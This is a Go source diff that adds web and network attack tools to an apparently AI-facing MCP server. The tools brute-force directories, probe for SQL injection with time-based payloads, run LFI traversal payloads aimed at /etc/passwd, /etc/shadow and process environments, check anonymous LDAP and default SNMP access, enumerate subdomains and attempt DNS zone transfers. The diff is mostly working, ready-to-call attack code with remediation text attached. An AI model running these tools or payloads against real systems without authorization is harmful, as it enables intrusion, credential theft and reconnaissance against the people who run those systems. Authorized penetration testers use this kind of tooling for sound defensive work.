@@ -100,6 +100,14 @@ func (s *MCPServer) registerTools() {
 	s.tools["web_scan"] = s.webScan
 	s.tools["grab_banner"] = s.grabBanner
 	s.tools["credential_spray"] = s.credentialSpray
+	// New curious modules
+	s.tools["dir_bruteforce"] = s.dirBruteforce
+	s.tools["sqli_test"] = s.sqliTest
+	s.tools["lfi_test"] = s.lfiTest
+	s.tools["check_ldap"] = s.checkLDAP
+	s.tools["check_snmp"] = s.checkSNMP
+	s.tools["subdomain_enum"] = s.subdomainEnum
+	s.tools["dns_zone_transfer"] = s.dnsZoneTransfer
 }
 
 func (s *MCPServer) getTools() []Tool {
@@ -270,6 +278,94 @@ func (s *MCPServer) getTools() []Tool {
 					"delay_ms":      {Type: "number", Description: "Delay between attempts per worker in ms (default: 100)"},
 				},
 				Required: []string{"target", "service"},
+			},
+		},
+		// New curious modules
+		{
+			Name:        "dir_bruteforce",
+			Description: "Bruteforce directories and files on a web server to find hidden paths, admin panels, backup files, and sensitive endpoints",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"url":        {Type: "string", Description: "Target URL (e.g., http://127.0.0.1:8080)"},
+					"wordlist":   {Type: "string", Description: "Wordlist: common, medium, large (default: common)"},
+					"extensions": {Type: "string", Description: "File extensions to try (e.g., php,asp,txt,bak)"},
+					"threads":    {Type: "number", Description: "Concurrent threads (default: 10)"},
+				},
+				Required: []string{"url"},
+			},
+		},
+		{
+			Name:        "sqli_test",
+			Description: "Test URL parameters for SQL injection vulnerabilities using error-based, blind, and time-based techniques",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"url":    {Type: "string", Description: "Target URL with parameters (e.g., http://site.com/page?id=1)"},
+					"method": {Type: "string", Description: "HTTP method: GET or POST (default: GET)"},
+					"data":   {Type: "string", Description: "POST data if method is POST"},
+				},
+				Required: []string{"url"},
+			},
+		},
+		{
+			Name:        "lfi_test",
+			Description: "Test for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"url":   {Type: "string", Description: "Target URL with file parameter (e.g., http://site.com/page?file=test)"},
+					"param": {Type: "string", Description: "Parameter name to test (default: auto-detect)"},
+				},
+				Required: []string{"url"},
+			},
+		},
+		{
+			Name:        "check_ldap",
+			Description: "Check if LDAP server allows anonymous bind or has weak authentication",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"target": {Type: "string", Description: "Target IP or hostname"},
+					"port":   {Type: "number", Description: "Port (default: 389)"},
+				},
+				Required: []string{"target"},
+			},
+		},
+		{
+			Name:        "check_snmp",
+			Description: "Check for SNMP with default community strings (public, private) - can expose system info",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"target":      {Type: "string", Description: "Target IP or hostname"},
+					"communities": {Type: "string", Description: "Comma-separated community strings to try (default: public,private)"},
+				},
+				Required: []string{"target"},
+			},
+		},
+		{
+			Name:        "subdomain_enum",
+			Description: "Enumerate subdomains using common wordlist and DNS resolution",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"domain":   {Type: "string", Description: "Target domain (e.g., example.com)"},
+					"wordlist": {Type: "string", Description: "Wordlist size: small, medium, large (default: small)"},
+				},
+				Required: []string{"domain"},
+			},
+		},
+		{
+			Name:        "dns_zone_transfer",
+			Description: "Attempt DNS zone transfer (AXFR) to enumerate all DNS records - CRITICAL if successful",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"domain":     {Type: "string", Description: "Target domain (e.g., example.com)"},
+					"nameserver": {Type: "string", Description: "Nameserver to query (optional, auto-detected)"},
+				},
+				Required: []string{"domain"},
 			},
 		},
 	}
@@ -1046,6 +1142,781 @@ func tryPostgres(host string, port int, username, password string) (bool, error)
 		return false, err
 	}
 	return true, nil
+}
+
+// ============================================================================
+// NEW CURIOUS MODULES - For thorough penetration testing
+// ============================================================================
+
+// dirBruteforce bruteforces directories and files on web servers
+func (s *MCPServer) dirBruteforce(args map[string]interface{}) (string, error) {
+	baseURL := args["url"].(string)
+	baseURL = strings.TrimSuffix(baseURL, "/")
+
+	wordlistType := "common"
+	if w, ok := args["wordlist"].(string); ok && w != "" {
+		wordlistType = w
+	}
+
+	extensions := []string{""}
+	if ext, ok := args["extensions"].(string); ok && ext != "" {
+		for _, e := range strings.Split(ext, ",") {
+			extensions = append(extensions, "."+strings.TrimPrefix(strings.TrimSpace(e), "."))
+		}
+	}
+
+	threads := 10
+	if t, ok := args["threads"].(float64); ok && t > 0 {
+		threads = int(t)
+		if threads > 50 {
+			threads = 50
+		}
+	}
+
+	// Common wordlists - these are real paths found in real pentests
+	commonPaths := []string{
+		// Admin panels
+		"admin", "administrator", "admin.php", "admin.html", "adminpanel",
+		"wp-admin", "wp-login.php", "phpmyadmin", "pma", "mysql", "myadmin",
+		"cpanel", "webmail", "panel", "manager", "control", "dashboard",
+		// Common files
+		"robots.txt", "sitemap.xml", ".htaccess", ".htpasswd", ".git/config",
+		".env", ".env.local", ".env.production", "config.php", "config.inc.php",
+		"configuration.php", "settings.php", "database.yml", "secrets.yml",
+		"wp-config.php", "wp-config.php.bak", "web.config", "config.json",
+		// Backup files
+		"backup", "backup.zip", "backup.tar.gz", "backup.sql", "db.sql",
+		"database.sql", "dump.sql", "site.zip", "www.zip", "html.zip",
+		"backup.bak", "old", "temp", "test", "dev", "staging",
+		// API endpoints
+		"api", "api/v1", "api/v2", "rest", "graphql", "swagger", "swagger.json",
+		"api-docs", "docs", "documentation", "apidoc", "v1", "v2",
+		// Auth endpoints
+		"login", "signin", "signup", "register", "auth", "oauth", "logout",
+		"password", "forgot", "reset", "verify", "confirm", "activate",
+		// Sensitive paths
+		"debug", "trace", "status", "health", "metrics", "info", "server-status",
+		"phpinfo.php", "info.php", "test.php", "debug.php", "console",
+		"shell", "cmd", "command", "exec", "system", "terminal",
+		// Hidden/sensitive directories
+		".git", ".svn", ".hg", ".bzr", "CVS", ".DS_Store", "Thumbs.db",
+		"node_modules", "vendor", "bower_components", "packages",
+		// Common apps
+		"wordpress", "wp", "blog", "cms", "joomla", "drupal", "magento",
+		"typo3", "concrete5", "jenkins", "gitlab", "bitbucket",
+		// Uploads
+		"uploads", "upload", "files", "images", "media", "static", "assets",
+		"content", "data", "documents", "downloads", "attachments",
+		// Include/config paths
+		"include", "includes", "inc", "lib", "libs", "classes", "src",
+		"core", "common", "shared", "private", "protected", "secure",
+	}
+
+	if wordlistType == "medium" {
+		commonPaths = append(commonPaths, []string{
+			"cgi-bin", "scripts", "bin", "cgi", "logs", "log", "tmp",
+			"cache", "session", "sessions", "temp", "temporary",
+			"invoice", "invoices", "order", "orders", "payment", "checkout",
+			"user", "users", "member", "members", "profile", "profiles",
+			"account", "accounts", "customer", "customers", "client", "clients",
+		}...)
+	}
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("Directory Bruteforce: %s\n", baseURL))
+	result.WriteString(fmt.Sprintf("Wordlist: %s (%d paths) | Extensions: %v | Threads: %d\n",
+		wordlistType, len(commonPaths), extensions, threads))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	type findResult struct {
+		path   string
+		status int
+		size   int64
+	}
+
+	found := make([]findResult, 0)
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+	semaphore := make(chan struct{}, threads)
+
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // Don't follow redirects
+		},
+	}
+
+	for _, path := range commonPaths {
+		for _, ext := range extensions {
+			fullPath := path + ext
+			wg.Add(1)
+			go func(p string) {
+				defer wg.Done()
+				semaphore <- struct{}{}
+				defer func() { <-semaphore }()
+
+				url := baseURL + "/" + p
+				resp, err := client.Get(url)
+				if err != nil {
+					return
+				}
+				defer resp.Body.Close()
+
+				// Interesting status codes
+				if resp.StatusCode == 200 || resp.StatusCode == 301 || resp.StatusCode == 302 ||
+					resp.StatusCode == 401 || resp.StatusCode == 403 {
+					mu.Lock()
+					found = append(found, findResult{
+						path:   p,
+						status: resp.StatusCode,
+						size:   resp.ContentLength,
+					})
+					mu.Unlock()
+				}
+			}(fullPath)
+		}
+	}
+
+	wg.Wait()
+
+	if len(found) > 0 {
+		result.WriteString("[FOUND] Discovered paths:\n")
+		for _, f := range found {
+			statusStr := ""
+			switch f.status {
+			case 200:
+				statusStr = "[200 OK]"
+			case 301, 302:
+				statusStr = fmt.Sprintf("[%d Redirect]", f.status)
+			case 401:
+				statusStr = "[401 Auth Required]"
+			case 403:
+				statusStr = "[403 Forbidden]"
+			}
+			result.WriteString(fmt.Sprintf("  %s /%s (size: %d)\n", statusStr, f.path, f.size))
+		}
+		result.WriteString(fmt.Sprintf("\nTotal: %d paths discovered\n", len(found)))
+	} else {
+		result.WriteString("[OK] No common paths found\n")
+	}
+
+	return result.String(), nil
+}
+
+// sqliTest tests for SQL injection vulnerabilities
+func (s *MCPServer) sqliTest(args map[string]interface{}) (string, error) {
+	targetURL := args["url"].(string)
+
+	method := "GET"
+	if m, ok := args["method"].(string); ok && m != "" {
+		method = strings.ToUpper(m)
+	}
+
+	// SQL injection payloads - designed to trigger errors or detect blind SQLi
+	payloads := []struct {
+		payload     string
+		description string
+		checkType   string // "error", "blind", "time"
+	}{
+		// Error-based
+		{"'", "Single quote", "error"},
+		{"\"", "Double quote", "error"},
+		{"1'", "Number with quote", "error"},
+		{"1\"", "Number with double quote", "error"},
+		{"' OR '1'='1", "Classic OR injection", "error"},
+		{"' OR '1'='1' --", "OR injection with comment", "error"},
+		{"' OR '1'='1' #", "OR injection with hash comment", "error"},
+		{"1' OR '1'='1", "Numeric OR injection", "error"},
+		{"1 OR 1=1", "Simple OR", "error"},
+		{"' UNION SELECT NULL--", "Union test", "error"},
+		{"' AND '1'='2", "False condition test", "blind"},
+		{"; SELECT * FROM users--", "Stacked query", "error"},
+		{"admin'--", "Username bypass", "error"},
+		// Time-based blind
+		{"' OR SLEEP(3)--", "MySQL sleep", "time"},
+		{"'; WAITFOR DELAY '0:0:3'--", "MSSQL waitfor", "time"},
+		{"' OR pg_sleep(3)--", "PostgreSQL sleep", "time"},
+	}
+
+	// SQL error patterns that indicate vulnerability
+	errorPatterns := []string{
+		"SQL syntax",
+		"mysql_fetch",
+		"mysql_query",
+		"mysql_num_rows",
+		"ORA-",
+		"Oracle error",
+		"PostgreSQL",
+		"pg_query",
+		"SQLite3",
+		"SQLITE_ERROR",
+		"Microsoft SQL",
+		"ODBC Driver",
+		"SQLServer JDBC",
+		"System.Data.SqlClient",
+		"Unclosed quotation mark",
+		"quoted string not properly terminated",
+		"You have an error in your SQL syntax",
+		"Warning: mysql",
+		"Warning: pg_",
+		"Warning: sqlite",
+		"PDOException",
+		"mysqli_",
+	}
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("SQL Injection Test: %s\n", targetURL))
+	result.WriteString(fmt.Sprintf("Method: %s\n", method))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+	}
+
+	vulnFound := false
+	var findings []string
+
+	// First, get baseline response
+	baseResp, err := client.Get(targetURL)
+	if err != nil {
+		return "", fmt.Errorf("failed to connect: %v", err)
+	}
+	baseBody, _ := io.ReadAll(baseResp.Body)
+	baseResp.Body.Close()
+	baseLen := len(baseBody)
+
+	for _, p := range payloads {
+		// Inject payload into URL parameters
+		testURL := targetURL
+		if strings.Contains(targetURL, "=") {
+			// Append payload to existing parameter
+			testURL = targetURL + p.payload
+		} else if strings.Contains(targetURL, "?") {
+			testURL = targetURL + "&test=" + p.payload
+		} else {
+			testURL = targetURL + "?id=" + p.payload
+		}
+
+		start := time.Now()
+		resp, err := client.Get(testURL)
+		elapsed := time.Since(start)
+
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		bodyStr := string(body)
+
+		// Check for SQL errors in response
+		for _, pattern := range errorPatterns {
+			if strings.Contains(bodyStr, pattern) {
+				vulnFound = true
+				findings = append(findings, fmt.Sprintf(
+					"[CRITICAL] SQL Error detected with payload: %s\n"+
+						"           Pattern matched: %s\n"+
+						"           Description: %s",
+					p.payload, pattern, p.description))
+				break
+			}
+		}
+
+		// Check for time-based blind SQLi
+		if p.checkType == "time" && elapsed > 2*time.Second {
+			vulnFound = true
+			findings = append(findings, fmt.Sprintf(
+				"[CRITICAL] Time-based blind SQLi detected!\n"+
+					"           Payload: %s\n"+
+					"           Response time: %v (expected delay)",
+				p.payload, elapsed))
+		}
+
+		// Check for significant content length change (blind SQLi indicator)
+		if p.checkType == "blind" {
+			diff := len(body) - baseLen
+			if diff > 100 || diff < -100 {
+				findings = append(findings, fmt.Sprintf(
+					"[WARNING] Content length anomaly with: %s\n"+
+						"          Base: %d, Test: %d, Diff: %d",
+					p.payload, baseLen, len(body), diff))
+			}
+		}
+	}
+
+	if vulnFound {
+		result.WriteString("[VULNERABLE] SQL Injection vulnerabilities found!\n\n")
+		for _, f := range findings {
+			result.WriteString(f + "\n\n")
+		}
+		result.WriteString("\nRemediation:\n")
+		result.WriteString("  - Use parameterized queries/prepared statements\n")
+		result.WriteString("  - Implement input validation and sanitization\n")
+		result.WriteString("  - Use ORM frameworks with proper escaping\n")
+		result.WriteString("  - Apply least privilege to database accounts\n")
+	} else if len(findings) > 0 {
+		result.WriteString("[WARNING] Potential issues found:\n\n")
+		for _, f := range findings {
+			result.WriteString(f + "\n\n")
+		}
+	} else {
+		result.WriteString("[OK] No SQL injection vulnerabilities detected\n")
+		result.WriteString("     (Note: This is not exhaustive - manual testing recommended)\n")
+	}
+
+	return result.String(), nil
+}
+
+// lfiTest tests for Local/Remote File Inclusion
+func (s *MCPServer) lfiTest(args map[string]interface{}) (string, error) {
+	targetURL := args["url"].(string)
+
+	paramName := ""
+	if p, ok := args["param"].(string); ok {
+		paramName = p
+	}
+
+	// LFI/RFI payloads
+	payloads := []struct {
+		payload     string
+		description string
+		indicator   string
+	}{
+		// Linux LFI
+		{"../../../etc/passwd", "Basic Linux passwd", "root:"},
+		{"....//....//....//etc/passwd", "Double encoding bypass", "root:"},
+		{"..%2f..%2f..%2fetc/passwd", "URL encoded traversal", "root:"},
+		{"..%252f..%252f..%252fetc/passwd", "Double URL encoded", "root:"},
+		{"/etc/passwd", "Absolute path", "root:"},
+		{"....//....//....//etc/shadow", "Shadow file attempt", "root:"},
+		{"../../../proc/self/environ", "Environment variables", "PATH="},
+		{"../../../var/log/apache2/access.log", "Apache logs", "HTTP"},
+		// Windows LFI
+		{"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts", "localhost"},
+		{"....\\\\....\\\\....\\\\windows\\win.ini", "Windows win.ini", "[fonts]"},
+		{"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", "URL encoded Windows", "localhost"},
+		// Null byte (legacy)
+		{"../../../etc/passwd%00", "Null byte terminator", "root:"},
+		{"../../../etc/passwd%00.png", "Null byte with extension", "root:"},
+		// Wrapper-based
+		{"php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper", "PD9waHA"},
+		{"php://input", "PHP input wrapper", ""},
+		{"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "PHP data wrapper", "phpinfo"},
+		{"expect://id", "Expect wrapper", "uid="},
+		// Path traversal variations
+		{"..././..././..././etc/passwd", "Mixed traversal", "root:"},
+		{"..;/..;/..;/etc/passwd", "Semicolon bypass", "root:"},
+	}
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("LFI/RFI Test: %s\n", targetURL))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+
+	vulnFound := false
+	var findings []string
+
+	for _, p := range payloads {
+		// Build test URL
+		testURL := targetURL
+		if paramName != "" {
+			if strings.Contains(targetURL, "?") {
+				testURL = targetURL + "&" + paramName + "=" + p.payload
+			} else {
+				testURL = targetURL + "?" + paramName + "=" + p.payload
+			}
+		} else if strings.Contains(targetURL, "=") {
+			// Append to existing parameter value
+			testURL = targetURL + p.payload
+		} else {
+			// Try common parameter names
+			testURL = targetURL + "?file=" + p.payload
+		}
+
+		resp, err := client.Get(testURL)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		bodyStr := string(body)
+
+		// Check for indicators
+		if p.indicator != "" && strings.Contains(bodyStr, p.indicator) {
+			vulnFound = true
+			findings = append(findings, fmt.Sprintf(
+				"[CRITICAL] LFI vulnerability confirmed!\n"+
+					"           Payload: %s\n"+
+					"           Description: %s\n"+
+					"           Indicator found: %s",
+				p.payload, p.description, p.indicator))
+		}
+	}
+
+	if vulnFound {
+		result.WriteString("[VULNERABLE] Local File Inclusion detected!\n\n")
+		for _, f := range findings {
+			result.WriteString(f + "\n\n")
+		}
+		result.WriteString("\nImpact:\n")
+		result.WriteString("  - Read sensitive system files (/etc/passwd, config files)\n")
+		result.WriteString("  - Potential Remote Code Execution via log poisoning\n")
+		result.WriteString("  - Credential theft and lateral movement\n")
+		result.WriteString("\nRemediation:\n")
+		result.WriteString("  - Never include files based on user input\n")
+		result.WriteString("  - Use whitelists for allowed files\n")
+		result.WriteString("  - Disable dangerous PHP wrappers\n")
+	} else {
+		result.WriteString("[OK] No LFI/RFI vulnerabilities detected\n")
+	}
+
+	return result.String(), nil
+}
+
+// checkLDAP checks for anonymous LDAP access
+func (s *MCPServer) checkLDAP(args map[string]interface{}) (string, error) {
+	target := args["target"].(string)
+	port := 389
+	if p, ok := args["port"].(float64); ok && p > 0 {
+		port = int(p)
+	}
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("LDAP Check: %s:%d\n", target, port))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	// Try to connect
+	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 5*time.Second)
+	if err != nil {
+		return result.String() + "[ERROR] Cannot connect to LDAP port\n", nil
+	}
+	defer conn.Close()
+
+	// LDAP anonymous bind request (simplified)
+	// This is a minimal LDAP bind request for anonymous access
+	bindRequest := []byte{
+		0x30, 0x0c, // SEQUENCE, length 12
+		0x02, 0x01, 0x01, // INTEGER messageID = 1
+		0x60, 0x07, // BindRequest, length 7
+		0x02, 0x01, 0x03, // INTEGER version = 3
+		0x04, 0x00, // OCTET STRING name = "" (empty = anonymous)
+		0x80, 0x00, // Simple auth, password = ""
+	}
+
+	conn.SetDeadline(time.Now().Add(5 * time.Second))
+	_, err = conn.Write(bindRequest)
+	if err != nil {
+		return result.String() + "[ERROR] Failed to send LDAP request\n", nil
+	}
+
+	response := make([]byte, 1024)
+	n, err := conn.Read(response)
+	if err != nil {
+		return result.String() + "[OK] LDAP rejected anonymous bind\n", nil
+	}
+
+	// Check for success response (resultCode = 0)
+	// A successful bind response contains resultCode 0 at a specific offset
+	if n > 10 && response[9] == 0x0a && response[10] == 0x01 && response[11] == 0x00 {
+		result.WriteString("[CRITICAL] LDAP Anonymous Bind Successful!\n\n")
+		result.WriteString("Impact:\n")
+		result.WriteString("  - Enumerate all users and groups\n")
+		result.WriteString("  - Extract email addresses and organizational info\n")
+		result.WriteString("  - Potential password policy discovery\n")
+		result.WriteString("  - Map Active Directory structure\n\n")
+		result.WriteString("Remediation:\n")
+		result.WriteString("  - Disable anonymous binds in LDAP configuration\n")
+		result.WriteString("  - Require authentication for all LDAP queries\n")
+	} else {
+		result.WriteString("[OK] LDAP requires authentication\n")
+	}
+
+	return result.String(), nil
+}
+
+// checkSNMP checks for SNMP with default community strings
+func (s *MCPServer) checkSNMP(args map[string]interface{}) (string, error) {
+	target := args["target"].(string)
+
+	communities := []string{"public", "private", "community", "snmp", "admin", "default", "cisco", "switch", "router"}
+	if c, ok := args["communities"].(string); ok && c != "" {
+		communities = strings.Split(c, ",")
+	}
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("SNMP Check: %s (UDP 161)\n", target))
+	result.WriteString(fmt.Sprintf("Testing communities: %v\n", communities))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	// SNMP v1/v2c GET request for sysDescr (OID 1.3.6.1.2.1.1.1.0)
+	buildSNMPGet := func(community string) []byte {
+		communityBytes := []byte(community)
+		// sysDescr OID: 1.3.6.1.2.1.1.1.0
+		oid := []byte{0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00}
+
+		// Build SNMP packet
+		pduLen := 2 + len(oid) + 4 // request-id + oid + null
+		varbindLen := len(oid) + 4
+		varbindListLen := varbindLen + 2
+
+		packet := []byte{
+			0x30, byte(25 + len(communityBytes) + varbindListLen), // SEQUENCE
+			0x02, 0x01, 0x01, // version = 1 (SNMPv2c)
+			0x04, byte(len(communityBytes)), // community string
+		}
+		packet = append(packet, communityBytes...)
+		packet = append(packet, []byte{
+			0xa0, byte(pduLen + varbindListLen + 6), // GetRequest PDU
+			0x02, 0x04, 0x00, 0x00, 0x00, 0x01, // request-id
+			0x02, 0x01, 0x00, // error-status
+			0x02, 0x01, 0x00, // error-index
+			0x30, byte(varbindListLen), // varbind list
+			0x30, byte(varbindLen), // varbind
+		}...)
+		packet = append(packet, oid...)
+		packet = append(packet, 0x05, 0x00) // NULL value
+
+		return packet
+	}
+
+	conn, err := net.DialTimeout("udp", fmt.Sprintf("%s:161", target), 2*time.Second)
+	if err != nil {
+		return result.String() + "[ERROR] Cannot connect to SNMP port\n", nil
+	}
+	defer conn.Close()
+
+	vulnFound := false
+	var foundCommunities []string
+
+	for _, community := range communities {
+		conn.SetDeadline(time.Now().Add(2 * time.Second))
+		packet := buildSNMPGet(community)
+		_, err := conn.Write(packet)
+		if err != nil {
+			continue
+		}
+
+		response := make([]byte, 2048)
+		n, err := conn.Read(response)
+		if err == nil && n > 0 {
+			// Got response - community string works!
+			vulnFound = true
+			foundCommunities = append(foundCommunities, community)
+		}
+	}
+
+	if vulnFound {
+		result.WriteString("[CRITICAL] SNMP accessible with community string(s)!\n\n")
+		result.WriteString("Working communities:\n")
+		for _, c := range foundCommunities {
+			result.WriteString(fmt.Sprintf("  - %s\n", c))
+		}
+		result.WriteString("\nImpact:\n")
+		result.WriteString("  - Read system information, interfaces, routing tables\n")
+		result.WriteString("  - Enumerate network topology\n")
+		result.WriteString("  - If 'private' works: potential to WRITE configuration!\n")
+		result.WriteString("\nRemediation:\n")
+		result.WriteString("  - Disable SNMP if not needed\n")
+		result.WriteString("  - Use SNMPv3 with authentication/encryption\n")
+		result.WriteString("  - Use strong, unique community strings\n")
+		result.WriteString("  - Restrict SNMP access by IP\n")
+	} else {
+		result.WriteString("[OK] SNMP not accessible with default communities\n")
+	}
+
+	return result.String(), nil
+}
+
+// subdomainEnum enumerates subdomains
+func (s *MCPServer) subdomainEnum(args map[string]interface{}) (string, error) {
+	domain := args["domain"].(string)
+
+	wordlistType := "small"
+	if w, ok := args["wordlist"].(string); ok && w != "" {
+		wordlistType = w
+	}
+
+	// Common subdomain wordlist
+	subdomains := []string{
+		"www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
+		"admin", "secure", "vpn", "api", "dev", "staging", "test", "beta", "demo",
+		"portal", "support", "help", "forum", "blog", "wiki", "docs", "cdn",
+		"static", "assets", "images", "media", "files", "download", "upload",
+		"app", "apps", "mobile", "m", "gateway", "gw", "git", "gitlab", "bitbucket",
+		"jenkins", "ci", "build", "deploy", "monitoring", "grafana", "kibana",
+		"elastic", "redis", "db", "database", "mysql", "postgres", "mongo",
+		"internal", "intranet", "corp", "corporate", "extranet", "partner",
+		"shop", "store", "payment", "checkout", "order", "orders",
+	}
+
+	if wordlistType == "medium" || wordlistType == "large" {
+		subdomains = append(subdomains, []string{
+			"ns3", "ns4", "dns", "dns1", "dns2", "mx", "mx1", "mx2",
+			"office", "remote", "proxy", "cache", "backup", "archive",
+			"old", "new", "v1", "v2", "alpha", "preview", "sandbox",
+			"qa", "uat", "prod", "production", "stage", "live",
+			"auth", "login", "sso", "oauth", "id", "identity",
+			"s3", "storage", "bucket", "cloud", "aws", "azure", "gcp",
+		}...)
+	}
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("Subdomain Enumeration: %s\n", domain))
+	result.WriteString(fmt.Sprintf("Wordlist: %s (%d subdomains)\n", wordlistType, len(subdomains)))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	var found []struct {
+		subdomain string
+		ips       []string
+	}
+
+	var wg sync.WaitGroup
+	var mu sync.Mutex
+	semaphore := make(chan struct{}, 20) // Limit concurrent DNS queries
+
+	for _, sub := range subdomains {
+		wg.Add(1)
+		go func(subdomain string) {
+			defer wg.Done()
+			semaphore <- struct{}{}
+			defer func() { <-semaphore }()
+
+			fqdn := subdomain + "." + domain
+			ips, err := net.LookupHost(fqdn)
+			if err == nil && len(ips) > 0 {
+				mu.Lock()
+				found = append(found, struct {
+					subdomain string
+					ips       []string
+				}{subdomain, ips})
+				mu.Unlock()
+			}
+		}(sub)
+	}
+
+	wg.Wait()
+
+	if len(found) > 0 {
+		result.WriteString("[FOUND] Discovered subdomains:\n")
+		for _, f := range found {
+			result.WriteString(fmt.Sprintf("  %s.%s -> %s\n", f.subdomain, domain, strings.Join(f.ips, ", ")))
+		}
+		result.WriteString(fmt.Sprintf("\nTotal: %d subdomains discovered\n", len(found)))
+	} else {
+		result.WriteString("[OK] No subdomains found with common names\n")
+	}
+
+	return result.String(), nil
+}
+
+// dnsZoneTransfer attempts DNS zone transfer
+func (s *MCPServer) dnsZoneTransfer(args map[string]interface{}) (string, error) {
+	domain := args["domain"].(string)
+
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("DNS Zone Transfer (AXFR): %s\n", domain))
+	result.WriteString(strings.Repeat("-", 60) + "\n\n")
+
+	// Get nameservers for the domain
+	nsRecords, err := net.LookupNS(domain)
+	if err != nil {
+		return result.String() + fmt.Sprintf("[ERROR] Cannot find nameservers: %v\n", err), nil
+	}
+
+	result.WriteString(fmt.Sprintf("Nameservers found: %d\n", len(nsRecords)))
+	for _, ns := range nsRecords {
+		result.WriteString(fmt.Sprintf("  - %s\n", ns.Host))
+	}
+	result.WriteString("\n")
+
+	// Build AXFR query
+	buildAXFRQuery := func(domain string) []byte {
+		// DNS header
+		header := []byte{
+			0x00, 0x01, // Transaction ID
+			0x00, 0x00, // Flags (standard query)
+			0x00, 0x01, // Questions: 1
+			0x00, 0x00, // Answers: 0
+			0x00, 0x00, // Authority: 0
+			0x00, 0x00, // Additional: 0
+		}
+
+		// QNAME (domain name in DNS format)
+		var qname []byte
+		for _, label := range strings.Split(domain, ".") {
+			qname = append(qname, byte(len(label)))
+			qname = append(qname, []byte(label)...)
+		}
+		qname = append(qname, 0x00) // Null terminator
+
+		// QTYPE = AXFR (252) and QCLASS = IN (1)
+		question := append(qname, 0x00, 0xfc, 0x00, 0x01)
+
+		// Combine header and question
+		query := append(header, question...)
+
+		// Prepend TCP length (2 bytes, big endian)
+		length := make([]byte, 2)
+		length[0] = byte(len(query) >> 8)
+		length[1] = byte(len(query))
+		return append(length, query...)
+	}
+
+	// Try zone transfer on each nameserver
+	vulnerable := false
+	for _, ns := range nsRecords {
+		nsHost := strings.TrimSuffix(ns.Host, ".")
+		conn, err := net.DialTimeout("tcp", nsHost+":53", 5*time.Second)
+		if err != nil {
+			result.WriteString(fmt.Sprintf("[SKIP] Cannot connect to %s:53\n", nsHost))
+			continue
+		}
+
+		conn.SetDeadline(time.Now().Add(10 * time.Second))
+		query := buildAXFRQuery(domain)
+		_, err = conn.Write(query)
+		if err != nil {
+			conn.Close()
+			continue
+		}
+
+		// Read response
+		response := make([]byte, 65535)
+		n, err := conn.Read(response)
+		conn.Close()
+
+		if err != nil || n < 12 {
+			result.WriteString(fmt.Sprintf("[OK] %s refused zone transfer\n", nsHost))
+			continue
+		}
+
+		// Check for AXFR response (not REFUSED/error)
+		// Skip TCP length (2 bytes), check RCODE in header
+		rcode := response[5] & 0x0f
+		if rcode == 0 && n > 50 { // NOERROR and substantial response
+			vulnerable = true
+			result.WriteString(fmt.Sprintf("\n[CRITICAL] %s allows zone transfer!\n", nsHost))
+			result.WriteString("           Full DNS records may be exposed!\n")
+			result.WriteString(fmt.Sprintf("           Response size: %d bytes\n", n))
+		} else {
+			result.WriteString(fmt.Sprintf("[OK] %s refused zone transfer (RCODE: %d)\n", nsHost, rcode))
+		}
+	}
+
+	if vulnerable {
+		result.WriteString("\n[IMPACT]\n")
+		result.WriteString("  - Complete enumeration of all DNS records\n")
+		result.WriteString("  - Discovery of internal hostnames and IPs\n")
+		result.WriteString("  - Identification of mail servers, nameservers\n")
+		result.WriteString("  - Potential reconnaissance for further attacks\n")
+		result.WriteString("\n[REMEDIATION]\n")
+		result.WriteString("  - Restrict AXFR to authorized secondary DNS servers only\n")
+		result.WriteString("  - Use TSIG (Transaction Signature) for zone transfer authentication\n")
+	}
+
+	return result.String(), nil
 }
 
 // Helper functions
